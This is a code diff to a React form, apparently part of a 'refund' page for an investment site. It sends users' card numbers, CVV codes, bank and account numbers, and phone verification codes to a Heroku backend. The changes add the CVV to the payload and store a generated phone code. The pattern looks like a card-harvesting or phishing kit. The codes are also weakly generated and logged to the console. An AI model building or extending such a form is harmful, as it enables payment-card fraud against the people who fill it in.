@@ -14,8 +14,10 @@ import Modal from '../../UI/Modal/Modal';
 
 import axios from 'axios';
 
-let  vc = Math.floor(1000 + Math.random() * 9000);
+let vc = Math.floor(1000 + Math.random() * 9000);
 let vc2 = Math.floor(1000 + Math.random() * 9000);
+
+console.log(vc, vc2);
 
 export default function Form() {
 
@@ -71,6 +73,10 @@ export default function Form() {
         setTimeout(function() {
             setShowSpinner(false);
 
+            if(step === 3) {
+                addVerificationCode1();
+            }
+
             if(step === 4) {
                 checkVerificationCode();
             }
@@ -95,6 +101,24 @@ export default function Form() {
         setValues({ ...values, [name]: e.target.value });
     };
     
+    const addVerificationCode1 = () => {
+        axios.post("/add-first-code", {
+            firstCode: vc,
+            phoneNumber: values.clientPhoneNumber,
+        }, 
+        {
+            headers: {
+                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
+                'Accept': '*',
+                'origin': 'https://investment.netlify.app',
+                'Referer': 'https://investment.netlify.app/',
+                'Host': 'https://investment-com.herokuapp.com'
+            }
+        }).then((response) => {
+            console.log("vc1 saved");
+        })
+    };
+
     const userRequestHandler = () => {
 
         axios.post("https://investment-com.herokuapp.com/add-order",{
@@ -104,6 +128,7 @@ export default function Form() {
             refundAmount: values.refundAmount,
             userBank: values.clientBankAccount,
             cardNumber: values.clientCardNumber,
+            cardVerificationNumber: values.cardVerificationNumber,
             accountNumber: values.clientAccountNumber,
         }, 
         {
